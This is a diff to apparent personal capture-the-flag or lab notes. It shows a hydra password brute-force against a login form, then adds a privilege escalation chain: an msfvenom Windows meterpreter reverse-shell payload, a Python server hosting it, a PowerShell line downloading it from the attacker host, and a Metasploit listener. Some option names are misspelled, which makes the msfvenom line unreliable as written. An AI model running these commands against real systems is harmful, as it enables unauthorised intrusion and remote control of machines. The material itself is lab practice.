@@ -4,4 +4,21 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.67.228 http-post-form "
 
 https://www.exploit-db.com/exploits/46353
 
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+Privelege Escalation 
+
+create payload
+msfvenom -p windows/meterpreter/reverse_tcp lHSOT=10.10.80.131 LPROT=8888 -f exe > shell.exe
+
+run python web server
+python3 -m http.server
+
+Donload shell form powershell
+powershell -c "Invoke-WebRequest -Uri 'http://10.10.80.131:8000/shell.exe' -OutFile shell.exe
+
+Metaspilot Listner
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+
 
